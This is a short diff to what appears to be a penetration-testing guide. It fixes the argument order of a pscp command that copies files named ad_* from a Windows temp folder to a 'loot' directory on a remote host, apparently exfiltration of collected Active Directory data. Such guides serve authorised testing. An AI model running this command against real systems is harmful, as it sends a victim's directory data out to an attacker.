@@ -287,5 +287,5 @@ Example: C:\>plink -ssh root@192.168.101.1
 ##### Alternative Procedure
 
 ```sh
-pscp c:\windows\temp\ad_* -P {port} root@192.168.101.1:/temp/loot
+pscp -P {port} c:\windows\temp\ad_* root@192.168.101.1:/temp/loot
 ```
